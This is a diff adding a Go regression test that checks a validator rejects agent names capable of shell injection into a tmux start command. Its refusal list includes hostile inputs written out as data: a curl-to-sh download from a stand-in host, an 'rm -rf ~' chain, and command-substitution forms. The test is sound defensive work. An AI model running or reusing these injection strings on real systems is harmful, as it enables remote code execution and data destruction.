@@ -373,3 +373,32 @@ func TestIngestEpicStatuses_MissingBranchIsNotAnError(t *testing.T) {
 		t.Fatalf("expected the epic untouched (branch absent), got %+v", e)
 	}
 }
+
+// TestValidateAgent is the M2 regression test: the agent name can come FROM THE
+// EPIC FILE (frontmatter agent:) and becomes the tmux session's shell-executed
+// start command on the target box — every shell-metacharacter form of the
+// "codex; curl …|sh" RCE shape must be refused before it can reach
+// watchdog.NewTmuxSessionCmd.
+func TestValidateAgent(t *testing.T) {
+	for _, ok := range []string{"codex", "claude", "my-agent_v2", "codex.sh", "Codex-2"} {
+		if err := validateAgent(ok); err != nil {
+			t.Errorf("validateAgent(%q): unexpected refusal: %v", ok, err)
+		}
+	}
+	for _, bad := range []string{
+		"codex; curl evil.sh|sh",
+		"codex && rm -rf ~",
+		"codex $(whoami)",
+		"codex `id`",
+		"codex --dangerously-skip-checks", // spaces = arguments: wrapper-script territory
+		"/usr/local/bin/codex",            // path slashes are refused too (must be on PATH)
+		"codex\nrm -rf ~",
+		"codex|tee",
+		"'codex'",
+		"",
+	} {
+		if err := validateAgent(bad); err == nil {
+			t.Errorf("validateAgent(%q): expected refusal, got nil", bad)
+		}
+	}
+}
